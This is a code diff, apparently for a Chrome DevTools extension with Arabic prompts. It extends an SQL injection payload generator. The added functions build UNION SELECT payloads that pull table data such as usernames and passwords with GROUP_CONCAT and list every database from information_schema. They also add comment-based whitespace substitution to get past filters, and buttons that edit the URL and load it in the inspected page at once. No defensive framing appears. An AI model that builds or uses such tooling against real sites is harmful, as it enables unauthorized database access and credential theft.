@@ -167,16 +167,25 @@ function askForColumnPayloadColumn(title, injectedValue) {
   closeMenus();
 }
 
+
+function normalizeDataExpression(input) {
+  const clean = input.trim();
+  if (!clean) return clean;
+
+  // إذا كتب المستخدم: username,password
+  // تتحول إلى: username,0x3a,password
+  // وإذا كتب: id,username,password
+  // تتحول إلى: id,0x3a,username,0x3a,password
+  // وإذا كان 0x3a موجوداً مسبقاً نترك النص كما هو.
+  if (/0x3a/i.test(clean)) return clean;
+
+  const parts = clean.split(",").map(part => part.trim()).filter(Boolean);
+  if (parts.length <= 1) return clean;
+
+  return parts.join(",0x3a,");
+}
+
 function askForDataPayloadColumn() {
-  const tableAnswer = prompt("data\nاكتب اسم الجدول table_name؟ مثال: users");
-  if (tableAnswer === null) return;
-
-  const tableName = tableAnswer.trim();
-  if (!tableName) {
-    alert("اكتب اسم الجدول");
-    return;
-  }
-
   const totalAnswer = prompt("data\nكم عدد الأعمدة الكلي؟ مثال: 6");
   if (totalAnswer === null) return;
 
@@ -195,16 +204,68 @@ function askForDataPayloadColumn() {
     return;
   }
 
-  const dataAnswer = prompt("data\nاكتب اسم data_name؟ مثال: username");
-  if (dataAnswer === null) return;
+  const tableAnswer = prompt("data\nاكتب اسم الجدول table_name؟ مثال: users");
+  if (tableAnswer === null) return;
 
-  const dataName = dataAnswer.trim();
-  if (!dataName) {
-    alert("اكتب اسم data_name");
+  const tableName = tableAnswer.trim();
+  if (!tableName) {
+    alert("اكتب اسم الجدول");
     return;
   }
 
-  const payload = "+union+select+" + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, dataName) + "+FROM+" + tableName + "+--+-";
+  const dataAnswer = prompt("data\nاكتب البيانات\nمثال: username,password");
+  if (dataAnswer === null) return;
+
+  const finalData = normalizeDataExpression(dataAnswer);
+  if (!finalData) {
+    alert("اكتب البيانات");
+    return;
+  }
+
+  const payload = "+union+select+" + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, finalData) + "+FROM+" + tableName + "+--+-";
+  insertPayload(payload, payload);
+  closeMenus();
+}
+
+function askForDataGroupConcatPayloadColumn() {
+  const totalAnswer = prompt("data GROUP_CONCAT\nكم عدد الأعمدة الكلي؟ مثال: 6");
+  if (totalAnswer === null) return;
+
+  const totalColumns = Number(totalAnswer.trim());
+  if (!Number.isInteger(totalColumns) || totalColumns <= 0) {
+    alert("اكتب عدد أعمدة صحيح أكبر من 0");
+    return;
+  }
+
+  const columnAnswer = prompt("data GROUP_CONCAT\nما رقم العمود المصاب؟ مثال: 4");
+  if (columnAnswer === null) return;
+
+  const vulnerableColumn = Number(columnAnswer.trim());
+  if (!Number.isInteger(vulnerableColumn) || vulnerableColumn <= 0 || vulnerableColumn > totalColumns) {
+    alert("رقم العمود المصاب لازم يكون بين 1 و " + totalColumns);
+    return;
+  }
+
+  const tableAnswer = prompt("data GROUP_CONCAT\nاكتب اسم الجدول table_name؟ مثال: users");
+  if (tableAnswer === null) return;
+
+  const tableName = tableAnswer.trim();
+  if (!tableName) {
+    alert("اكتب اسم الجدول");
+    return;
+  }
+
+  const dataAnswer = prompt(" ادخل البيانات \nمثال: username,password");
+  if (dataAnswer === null) return;
+
+  const dataName = normalizeDataExpression(dataAnswer);
+  if (!dataName) {
+    alert("اكتب البيانات");
+    return;
+  }
+
+  const injectedValue = "GROUP_CONCAT(" + dataName + "+SEPARATOR+0x3c62723e)";
+  const payload = "+union+select+" + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, injectedValue) + "+FROM+" + tableName + "+--+-";
   insertPayload(payload, payload);
   closeMenus();
 }
@@ -229,6 +290,56 @@ function askForAllDatabasePayloadColumn() {
   }
 
   const payload = "UNION+SELECT+" + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, "schema_name") + "+FROM+information_schema.schemata+--+-";
+  insertPayload(payload, payload);
+  closeMenus();
+}
+
+function askForAllDatabaseGroupConcatPayloadColumn() {
+  const totalAnswer = prompt("all database GROUP_CONCAT\nكم عدد الأعمدة الكلي؟ مثال: 6");
+  if (totalAnswer === null) return;
+
+  const totalColumns = Number(totalAnswer.trim());
+  if (!Number.isInteger(totalColumns) || totalColumns <= 0) {
+    alert("اكتب عدد أعمدة صحيح أكبر من 0");
+    return;
+  }
+
+  const columnAnswer = prompt("all database GROUP_CONCAT\nما رقم العمود المصاب؟ مثال: 4");
+  if (columnAnswer === null) return;
+
+  const vulnerableColumn = Number(columnAnswer.trim());
+  if (!Number.isInteger(vulnerableColumn) || vulnerableColumn <= 0 || vulnerableColumn > totalColumns) {
+    alert("رقم العمود المصاب لازم يكون بين 1 و " + totalColumns);
+    return;
+  }
+
+  const injectedValue = "GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)";
+  const payload = "UNION+SELECT+" + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, injectedValue) + "+FROM+information_schema.schemata+--+-";
+  insertPayload(payload, payload);
+  closeMenus();
+}
+
+
+function askForDatabaseListPayloadColumn(title, injectedValue) {
+  const totalAnswer = prompt(title + "\nكم عدد الأعمدة الكلي؟ مثال: 8");
+  if (totalAnswer === null) return;
+
+  const totalColumns = Number(totalAnswer.trim());
+  if (!Number.isInteger(totalColumns) || totalColumns <= 0) {
+    alert("اكتب عدد أعمدة صحيح أكبر من 0");
+    return;
+  }
+
+  const columnAnswer = prompt(title + "\nما رقم العمود المصاب؟ مثال: 3");
+  if (columnAnswer === null) return;
+
+  const vulnerableColumn = Number(columnAnswer.trim());
+  if (!Number.isInteger(vulnerableColumn) || vulnerableColumn <= 0 || vulnerableColumn > totalColumns) {
+    alert("رقم العمود المصاب لازم يكون بين 1 و " + totalColumns);
+    return;
+  }
+
+  const payload = "UNION+SELECT+" + buildColumnsWithInjectedValue(totalColumns, vulnerableColumn, injectedValue) + "+FROM+information_schema.schemata+--+-";
   insertPayload(payload, payload);
   closeMenus();
 }
@@ -374,14 +485,30 @@ document.querySelectorAll(".action").forEach(item => {
       askForColumnPayloadColumn("column_name", "column_name");
     }
     if (action === "dynamic-column-group-concat-column") {
-      askForColumnPayloadColumn("GROUP_CONCAT", "GROUP_CONCAT(column_name)");
+      askForColumnPayloadColumn("GROUP_CONCAT", "GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)");
     }
 
     if (action === "dynamic-data-column") {
       askForDataPayloadColumn();
     }
+    if (action === "dynamic-data-group-concat-column") {
+      askForDataGroupConcatPayloadColumn();
+    }
     if (action === "dynamic-all-database-column") {
       askForAllDatabasePayloadColumn();
+    }
+    if (action === "dynamic-all-database-group-concat-column") {
+      askForAllDatabaseGroupConcatPayloadColumn();
+    }
+
+    if (action === "dynamic-databases-column") {
+      askForDatabaseListPayloadColumn("databases", "schema_name");
+    }
+    if (action === "dynamic-concat-databases-column") {
+      askForDatabaseListPayloadColumn("concat databases", "concat(schema_name,0x0a)");
+    }
+    if (action === "dynamic-group-concat-databases-column") {
+      askForDatabaseListPayloadColumn("group concat databases", "GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)");
     }
 
     if (action === "dynamic-privilege-type-column") {
@@ -438,6 +565,73 @@ function transformInput(fn) {
   }
 }
 
+function replaceWhitespace(separator) {
+  transformInput(text => text.replace(/\s+/g, separator));
+}
+
+function clearWhitespaceReplacement(text) {
+  return text
+    .replace(/\/\*\*\//g, " ")
+    .replace(/%20/gi, " ")
+    .replace(/%09/gi, " ")
+    .replace(/%0a/gi, " ")
+    .replace(/\+/g, " ")
+    .replace(/\s+/g, " ")
+    .trim();
+}
+
+function changeCurrentSelectionNumber(delta) {
+  saveSelection();
+
+  if (!hasSelection) {
+    alert("حدد رقم داخل Payload ثم اضغط + أو -");
+    box.focus();
+    return false;
+  }
+
+  const text = selectedText().trim();
+  if (!/^-?\d+$/.test(text)) {
+    alert("التحديد لازم يكون رقم فقط. مثال: حدد 5 ثم اضغط + أو -");
+    box.focus();
+    return false;
+  }
+
+  const nextValue = String(Number(text) + delta);
+  box.value = box.value.substring(0, start) + nextValue + box.value.substring(end);
+  box.focus();
+  box.setSelectionRange(start, start + nextValue.length);
+  saveSelection();
+  return true;
+}
+
+function applyInvalidIdTechnique(mode, value) {
+  saveSelection();
+
+  if (!hasSelection) {
+    insertPayload(value, value);
+    return;
+  }
+
+  const current = selectedText();
+  let nextValue = value;
+
+  if (mode === "prefix") nextValue = value + current;
+  if (mode === "append") nextValue = current + value;
+  if (mode === "replace") nextValue = value;
+
+  box.value = box.value.substring(0, start) + nextValue + box.value.substring(end);
+  box.focus();
+  box.setSelectionRange(start, start + nextValue.length);
+  saveSelection();
+}
+
+document.querySelectorAll(".invalid-id").forEach(item => {
+  item.addEventListener("click", () => {
+    applyInvalidIdTechnique(item.dataset.mode || "replace", item.dataset.value || "");
+    closeMenus();
+  });
+});
+
 function hexEncode(text) {
   return Array.from(text).map(c => c.charCodeAt(0).toString(16).padStart(2, "0")).join("");
 }
@@ -456,6 +650,9 @@ document.querySelectorAll(".tool").forEach(item => {
     if (tool === "b64Decode") transformInput(t => decodeURIComponent(escape(atob(t))));
     if (tool === "hexEncode") transformInput(hexEncode);
     if (tool === "hexDecode") transformInput(hexDecode);
+    if (tool === "replaceWhitespacePlus") replaceWhitespace("+");
+    if (tool === "replaceWhitespaceComment") replaceWhitespace("/**/");
+    if (tool === "clearWhitespaceReplace") transformInput(clearWhitespaceReplacement);
     closeMenus();
   });
 });
@@ -471,19 +668,31 @@ document.getElementById("loadUrl").onclick = () => {
   });
 };
 
-document.getElementById("execute").onclick = () => {
+function executeCurrentPayload() {
   const finalUrl = box.value.trim();
   if (!finalUrl.startsWith("http")) {
     box.value = "Invalid URL";
-    return;
+    return false;
   }
   chrome.devtools.inspectedWindow.eval("window.location.href=" + JSON.stringify(finalUrl));
-};
+  return true;
+}
+
+document.getElementById("execute").onclick = executeCurrentPayload;
 
 document.getElementById("clear").onclick = () => {
   box.value = "";
   box.focus();
   saveSelection();
+};
+
+document.getElementById("plusSelection").addEventListener("mousedown", saveSelection);
+document.getElementById("minusSelection").addEventListener("mousedown", saveSelection);
+document.getElementById("plusSelection").onclick = () => {
+  if (changeCurrentSelectionNumber(1)) executeCurrentPayload();
+};
+document.getElementById("minusSelection").onclick = () => {
+  if (changeCurrentSelectionNumber(-1)) executeCurrentPayload();
 };
 
 document.getElementById("loadUrl").click();
